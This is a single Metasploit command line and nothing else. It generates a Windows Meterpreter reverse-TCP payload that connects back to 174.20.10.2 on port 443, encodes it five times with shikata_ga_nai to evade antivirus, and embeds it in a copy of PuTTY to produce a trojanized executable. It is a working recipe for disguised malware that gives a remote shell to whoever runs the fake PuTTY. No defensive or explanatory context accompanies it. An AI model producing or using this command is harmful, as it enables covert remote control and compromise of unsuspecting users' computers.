msfpayload windows/meterpreter/reverse_tcp LHOST=174.20.10.2 LPORT=443 R | msfencode -e x86/shikata_ga_nai -c 5 -t exe -x ~/Desktop/putty.exe -o /home/anonymous/Desktop/puttyX.exe
